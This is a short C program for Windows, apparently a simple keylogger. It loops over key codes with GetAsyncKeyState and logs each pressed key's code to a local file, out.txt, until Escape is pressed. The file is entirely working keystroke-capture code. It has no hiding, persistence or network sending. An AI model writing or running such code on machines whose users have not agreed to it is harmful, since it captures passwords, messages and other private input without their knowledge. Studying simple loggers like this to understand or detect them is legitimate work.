#include <stdio.h>
#include <windows.h>

int main()
{
    FILE *output_file = fopen("out.txt", "w");
    while (1)
    {
        for (int key = 8; key <= 255; key++)
        {
            if (GetAsyncKeyState(key) & 0x8000)
            {
                fprintf(output_file, "Keycode: %d\n", key);
                if (key == VK_ESCAPE)
                    return 0;
                Sleep(200);
                fflush(output_file);
            }
        }
    }

    fclose(output_file);
}
